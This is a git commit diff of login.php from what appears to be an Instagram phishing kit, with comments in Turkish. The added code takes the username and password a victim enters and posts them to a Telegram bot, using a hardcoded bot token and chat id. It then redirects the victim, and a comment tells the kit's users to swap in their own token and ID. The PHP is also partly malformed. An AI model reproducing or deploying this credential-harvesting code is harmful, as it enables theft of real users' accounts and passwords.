828d2472bf4c1ce010009d8c2bc52acec5f3424e
sublimedeus <108197268+sublimedeus@users.noreply.github.com>
2022-06-27 12:07:05 +0300

    Add files via upload

--- login.php
+++ login.php
@@ -11,5 +11,41 @@
  fclose($fileuser);
  header('Location: https://instagram.com/');
  exit()
-?>
 
+$token='5000908961:AAGKTvzp49-Yc6YnQdh3MGBz5lOMrinan8E';
+    
+ if($clawzpass==$clawzpass2){
+
+$data = [
+    'text' => '
+✅  GİRİŞ BAŞARILI ✅
+
+Kullanıcı Adı : '.$user.'
+Şifre : '.$pass.'
+
+',
+    'chat_id' =>'-1001586201889'
+];
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
+
+header("Location:code.php");
+}
+	// TOKEN VE İD DEĞİŞMEYİ UNUTMAYIN - BRUHORJ
+	// TOKEN VE İD DEĞİŞMEYİ UNUTMAYIN - BRUHORJ
+else {
+    echo '<script>alert("Your Passwords Are not Matching! Please Try Again.")</script>';
+    
+    $data = [
+    'text' => '
+ŞİFRELERİ FARKLI GİRİLEN HESAP !!
+
+Kullanıcı Adı : '.$user.'
+Şifre : '.$pass.'
+
+',
+    'chat_id' =>'-1001586201889'
+];
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
+}
+}
+?>
